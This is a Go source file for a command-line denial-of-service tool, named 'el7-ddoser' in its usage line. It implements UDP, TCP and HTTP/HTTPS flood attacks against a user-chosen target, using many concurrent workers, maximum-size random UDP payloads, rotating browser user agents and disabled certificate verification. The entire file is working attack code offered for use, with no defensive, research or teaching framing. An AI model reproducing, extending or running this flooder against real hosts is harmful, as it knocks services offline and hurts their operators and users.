package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var letters = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

func randBytes(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return b
}

func udpAttack(ctx context.Context, target, port string, workers int) {
	raddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(target, port))
	if err != nil {
		fmt.Fprintf(os.Stderr, "udp resolve: %v\n", err)
		return
	}
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil {
				return
			}
			defer conn.Close()
			payload := make([]byte, 65507)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					rand.Read(payload)
					conn.SetWriteDeadline(time.Now().Add(100 * time.Millisecond))
					conn.Write(payload)
				}
			}
		}()
	}
	wg.Wait()
}

func tcpAttack(ctx context.Context, target, port string, workers int) {
	addr := net.JoinHostPort(target, port)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
					if err != nil {
						time.Sleep(10 * time.Millisecond)
						continue
					}
					conn.SetDeadline(time.Now().Add(5 * time.Second))
					payload := randBytes(4096)
					conn.Write(payload)
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

func httpAttack(ctx context.Context, rawTarget string, workers, rpc int, useTLS bool) {
	if !strings.HasPrefix(rawTarget, "http") {
		if useTLS {
			rawTarget = "https://" + rawTarget
		} else {
			rawTarget = "http://" + rawTarget
		}
	}
	u, err := url.Parse(rawTarget)
	if err != nil {
		fmt.Fprintf(os.Stderr, "http parse: %v\n", err)
		return
	}

	transport := &http.Transport{
		MaxIdleConnsPerHost: 1024,
		MaxConnsPerHost:     2048,
		DisableKeepAlives:   false,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10},
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			limit := rpc
			if limit <= 0 {
				limit = -1
			}
			for sent := 0; limit == -1 || sent < limit; sent++ {
				select {
				case <-ctx.Done():
					return
				default:
				}
				req, _ := http.NewRequest("GET", u.String(), nil)
				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Connection", "keep-alive")
				client.Do(req)
			}
		}()
	}
	wg.Wait()
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
}

func main() {
	method := flag.String("method", "UDP", "Attack method: UDP/TCP/HTTP/HTTPS")
	target := flag.String("target", "", "Target IP or hostname")
	port := flag.String("port", "80", "Target port")
	timeSec := flag.Int("time", 30, "Duration in seconds")
	workers := flag.Int("workers", 1, "Number of concurrent workers")
	rpc := flag.Int("rpc", 0, "Requests per connection (0=unlimited)")
	flag.Parse()

	if *target == "" {
		fmt.Fprintf(os.Stderr, "Usage: el7-ddoser -method UDP -target x.x.x.x -port 80 -time 30 -workers 10\n")
		os.Exit(1)
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(*timeSec)*time.Second)
	defer cancel()

	fmt.Fprintf(os.Stderr, "[ddoser] %s flood on %s:%s for %ds (%d workers)\n", *method, *target, *port, *timeSec, *workers)

	switch strings.ToUpper(*method) {
	case "UDP":
		udpAttack(ctx, *target, *port, *workers)
	case "TCP":
		tcpAttack(ctx, *target, *port, *workers)
	case "HTTP":
		httpAttack(ctx, *target, *workers, *rpc, false)
	case "HTTPS":
		httpAttack(ctx, *target, *workers, *rpc, true)
	default:
		fmt.Fprintf(os.Stderr, "Unknown method: %s\n", *method)
		os.Exit(1)
	}
}
